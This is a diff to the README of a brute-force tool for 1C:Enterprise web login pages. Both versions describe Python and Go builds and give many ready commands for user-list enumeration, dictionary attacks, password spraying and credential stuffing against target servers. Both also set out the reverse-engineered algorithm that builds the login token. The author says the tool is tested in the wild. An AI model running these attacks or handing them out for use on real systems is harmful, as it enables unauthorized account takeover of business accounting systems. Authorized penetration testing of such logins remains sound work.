@@ -1,118 +1,107 @@
 # wb1c
-web bruter for 1c
 
-I reversed javascript from 1c login page. Understood how the algorithm works while generating auth-string before sending on the server.
+Web credential bruter for 1C:Enterprise web clients.
 
-## What in files?
-- `1c_bruter.py` — POC written by me, tested and works in the wild
-- `1c_bruter.go` — Go version: no dependencies, single binary, TLS 1.0+ support for legacy corporate servers
+I reversed the JavaScript from a 1C login page and figured out how the auth token is generated before being sent to the server.
 
-## Requirements
+## Files
 
-**Python version:**
+| File | Description |
+|------|-------------|
+| `1c_bruter.py` | Python version (POC, tested in the wild) |
+| `1c_bruter.go` | Go version — single binary, no dependencies, TLS 1.0+ for legacy corporate servers |
+
+## Install
+
+**Python:**
 ```bash
 pip install -r requirements.txt
 ```
 
-**Go version** — no dependencies, just build:
+**Go** (produces a single static binary):
 ```bash
 go build -o wb1c 1c_bruter.go
 # Windows:
 go build -o wb1c.exe 1c_bruter.go
 ```
 
-## Help
+## Flags
 
-**Python:**
-```
-usage: 1c_bruter.py [-h] [-u USER] [-U USERS] [-p PASSWORD] [-P PASSWORDS] [-l] [-o OUTPUT] url
-
-options:
-  -u USER       Username to check
-  -U USERS      File with usernames list
-  -p PASSWORD   Password to try
-  -P PASSWORDS  File with passwords list
-  -l            Fetch users list from the server
-  -o OUTPUT     Save results to file
-```
-
-**Go:**
-```
-Usage: wb1c [-u USER] [-U FILE] [-p PASSWORD] [-P FILE] [-l] [-v] [-o OUTPUT] URL
-
-  -u USER       Username to check
-  -U FILE       File with usernames list
-  -p PASSWORD   Password to try
-  -P FILE       File with passwords list
-  -l            Fetch users list from the server
-  -v            Verbose: show all attempts including failures
-  -o OUTPUT     Save results to file
-```
+| Flag | Python | Go | Description |
+|------|--------|----|-------------|
+| `-u USER` | ✓ | ✓ | Single username |
+| `-U FILE` | ✓ | ✓ | File with usernames (one per line) |
+| `-p PASS` | ✓ | ✓ | Single password |
+| `-P FILE` | ✓ | ✓ | File with passwords (one per line) |
+| `-l` | ✓ | ✓ | Fetch users list from the server |
+| `-v` | — | ✓ | Verbose: show every attempt including failures |
+| `-o FILE` | ✓ | ✓ | Save results to file |
 
 ## Usage Examples
 
 ### Recon — get users list
 
 ```bash
-# Python
-python 1c_bruter.py -l http://target-server/InfoBase
+python 1c_bruter.py -l https://target/InfoBase
+./wb1c -l https://target/InfoBase
 
-# Go
-./wb1c -l http://target-server/InfoBase
-./wb1c -l -o users.txt http://192.168.1.100/accounting
+# Save to file
+python 1c_bruter.py -l -o users.txt https://192.168.1.100/accounting
+./wb1c    -l -o users.txt https://192.168.1.100/accounting
 ```
 
 ### Check specific credentials
 
 ```bash
-# Python
-python 1c_bruter.py -u Administrator -p "Password123" http://target-server/InfoBase
+python 1c_bruter.py -u Administrator -p "Password123" https://target/InfoBase
+./wb1c    -u Administrator -p "Password123" https://target/InfoBase
 
-# Go
-./wb1c -u Administrator -p "Password123" http://target-server/InfoBase
-./wb1c -u Administrator -p "" http://192.168.1.100/production
+# Empty password
+python 1c_bruter.py -u Administrator -p "" https://target/InfoBase
+./wb1c    -u Administrator -p "" https://target/InfoBase
 ```
 
-### Dictionary attack
+### Dictionary attack — one user, many passwords
 
 ```bash
-# Single user, multiple passwords
-./wb1c -u Accountant -P passwords.txt http://target-server/InfoBase
+python 1c_bruter.py -u Accountant -P passwords.txt https://target/InfoBase
+./wb1c    -u Accountant -P passwords.txt https://target/InfoBase
 
-# With verbose output and results saved
-./wb1c -u Administrator -P common_passwords.txt -v -o results.txt http://192.168.1.100/accounting
+# Go: verbose + save results
+./wb1c -u Administrator -P passwords.txt -v -o results.txt https://target/InfoBase
 ```
 
-### Password spraying
+### Password spraying — many users, one password
 
 ```bash
-# Single password against user list
-./wb1c -U users.txt -p "Spring2024" http://target-server/InfoBase
-
-# Check empty passwords for all users
-./wb1c -U users.txt -p "" -o empty_passwords.txt http://192.168.1.100/production
+python 1c_bruter.py -U users.txt -p "Spring2024" https://target/InfoBase
+./wb1c    -U users.txt -p "Spring2024" https://target/InfoBase
 ```
 
-### Credential stuffing
+### Credential stuffing — user list + password list
 
 ```bash
-# User list + password list
-./wb1c -U users.txt -P passwords.txt http://target-server/InfoBase
+python 1c_bruter.py -U users.txt -P passwords.txt https://target/InfoBase
+./wb1c    -U users.txt -P passwords.txt https://target/InfoBase
 
-# With verbose output
-./wb1c -U discovered_users.txt -P top1000.txt -v -o compromised.txt http://192.168.1.100/accounting
+# Save results
+python 1c_bruter.py -U users.txt -P passwords.txt -o results.txt https://target/InfoBase
+./wb1c    -U users.txt -P passwords.txt -o results.txt https://target/InfoBase
 ```
 
-### Fetch users + bruteforce in one command (Go only)
+### Fetch users from server + bruteforce in one command
 
 ```bash
-./wb1c -l -P passwords.txt http://target-server/InfoBase
+python 1c_bruter.py -l -P passwords.txt https://target/InfoBase
+./wb1c    -l -P passwords.txt https://target/InfoBase
 ```
 
 ## Algorithm
-- key1 = `AES256-CBC(data=rand(32 bytes), key=sha256(base64(sha1(password)))`
-- key2 = `AES256-CBC(data=rand(32 bytes), key=sha256(base64(sha1(upper(password))))`
-- data1 = `bytes(login)`
-- payload = `[1, len(key1), key1, len(key2), key2, packed_little-endian(len(data1)), data1]`
-- checksum = `crc32(payload)`
-- result = `base64(payload + packed_little-endian(checksum))`
+
+```
+key1     = AES256-CBC(data=rand(32), key=sha256(base64(sha1(password))))
+key2     = AES256-CBC(data=rand(32), key=sha256(base64(sha1(upper(password)))))
+payload  = [0x01, len(key1), key1, len(key2), key2, LE32(len(username)), username]
+checksum = crc32(payload)
+token    = base64(payload + LE32(checksum))
+```
